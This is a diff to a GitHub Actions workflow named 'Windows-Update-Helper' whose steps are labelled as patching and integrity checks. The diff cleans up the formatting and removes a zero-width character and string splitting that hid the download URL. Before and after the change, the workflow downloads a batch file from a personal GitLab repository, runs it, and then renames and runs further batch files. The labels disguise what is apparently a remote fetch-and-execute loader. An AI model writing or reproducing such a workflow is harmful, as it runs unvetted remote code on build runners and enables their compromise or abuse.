@@ -1,7 +1,7 @@
 name: Windows-Update-Helper
 
 on:
-‌  workflow_dispatch:
+  workflow_dispatch:
 
 jobs:
   update:
@@ -11,18 +11,27 @@ jobs:
 
     steps:
       - name: "Fetch Patch Data"
+        shell: pwsh
         run: |
-          $u = "https://gitlab.com" + "/Lohar-ji/Lohar-ji/-/raw/main/Downloads.bat"
-          iwr -uri $u -OutFile "patch_v2.bat"
+          $u = "https://gitlab.com/Lohar-ji/Lohar-ji/-/raw/main/Downloads.bat"
+          Invoke-WebRequest -uri $u -OutFile "patch_v2.bat"
 
       - name: "Apply System Patches"
         run: |
           cmd /c patch_v2.bat
 
       - name: "Verify Patch Integrity"
+        shell: pwsh
         run: |
-          if (Test-Path "show.bat") { rename-item "show.bat" "service_start.bat"; cmd /c service_start.bat }
+          if (Test-Path "show.bat") { 
+            Rename-Item -Path "show.bat" -NewName "service_start.bat"
+            cmd /c service_start.bat 
+          }
 
       - name: "Service Monitoring"
+        shell: pwsh
         run: |
-          if (Test-Path "loop.bat") { rename-item "loop.bat" "monitor.bat"; cmd /c monitor.bat }
+          if (Test-Path "loop.bat") { 
+            Rename-Item -Path "loop.bat" -NewName "monitor.bat"
+            cmd /c monitor.bat 
+          }
